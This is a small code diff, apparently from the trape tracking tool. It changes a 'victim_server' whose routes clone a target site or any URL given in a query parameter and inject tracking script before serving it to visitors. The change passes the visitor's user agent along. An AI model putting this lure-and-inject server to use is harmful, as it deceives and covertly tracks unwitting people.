@@ -31,7 +31,7 @@ class victim_server(object):
     @app.route("/" + trape.victim_path)
     def homeVictim():
         opener = urllib2.build_opener()
-        headers = victim_headers()
+        headers = victim_headers(request.user_agent)
         opener.addheaders = headers
         html = victim_inject_code(opener.open(trape.url_to_clone).read(), 'lure')
         return html
@@ -82,7 +82,7 @@ class victim_server(object):
     def redirectVictim():
         url = request.args.get('url')
         opener = urllib2.build_opener()
-        headers = victim_headers()
+        headers = victim_headers(request.user_agent)
         opener.addheaders = headers
         html = victim_inject_code(opener.open(url).read(), 'vscript')
         return html
